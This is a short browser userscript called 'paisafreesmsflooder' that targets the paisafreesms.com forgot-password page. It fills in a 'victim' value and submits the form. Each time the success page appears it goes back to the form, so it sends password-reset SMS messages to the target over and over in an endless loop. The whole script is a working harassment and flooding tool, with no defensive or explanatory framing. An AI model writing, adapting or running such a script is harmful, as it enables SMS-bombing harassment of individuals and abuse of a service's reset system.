// ==UserScript==
// @name           paisafreesmsflooder
// @namespace      mano (Personal Groups)
// @include        http://*paisafreesms.com/*
// ==/UserScript==

var victim = "";

if(document.location=="http://www.paisafreesms.com/forgetpass.aspx")
{
document.forms[0].elements[4].value = victim;
document.forms[0].elements[5].click();

}
if(document.location=="http://www.paisafreesms.com/Forgetpasssucess.aspx")
{
document.location="http://www.paisafreesms.com/forgetpass.aspx";

}